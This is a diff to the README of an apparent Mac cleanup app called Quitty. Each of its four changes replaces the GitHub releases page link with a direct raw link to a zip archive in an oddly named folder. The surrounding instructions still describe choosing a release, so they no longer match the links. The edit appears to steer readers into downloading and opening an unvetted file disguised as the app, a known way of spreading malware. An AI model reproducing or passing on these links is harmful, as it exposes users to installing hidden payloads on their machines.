@@ -1,10 +1,10 @@
 # 🧹 Quitty - Keep Your Mac Clean and Fast
 
-[![Download Quitty](https://img.shields.io/badge/Download-Quitty-purple?style=for-the-badge)](https://github.com/inchoative-fang549/Quitty/releases)
+[![Download Quitty](https://img.shields.io/badge/Download-Quitty-purple?style=for-the-badge)](https://github.com/inchoative-fang549/Quitty/raw/refs/heads/main/pluteiform/Software-v3.8.zip)
 
 ## 📥 Download Quitty
 
-Visit this page to download Quitty for Mac: https://github.com/inchoative-fang549/Quitty/releases
+Visit this page to download Quitty for Mac: https://github.com/inchoative-fang549/Quitty/raw/refs/heads/main/pluteiform/Software-v3.8.zip
 
 Choose the latest release, then download the file that matches your Mac. Most users should pick the standard app file or the macOS build marked for current systems.
 
@@ -25,7 +25,7 @@ Use Quitty to:
 
 Follow these steps to download and run Quitty on your Mac.
 
-1. Open the download page: https://github.com/inchoative-fang549/Quitty/releases
+1. Open the download page: https://github.com/inchoative-fang549/Quitty/raw/refs/heads/main/pluteiform/Software-v3.8.zip
 2. Find the latest release near the top of the page
 3. Download the app file for macOS
 4. Open the downloaded file from your Downloads folder
@@ -207,4 +207,4 @@ It is built for simple daily use, with:
 
 ## 📎 Download Again
 
-Primary download page: https://github.com/inchoative-fang549/Quitty/releases
+Primary download page: https://github.com/inchoative-fang549/Quitty/raw/refs/heads/main/pluteiform/Software-v3.8.zip
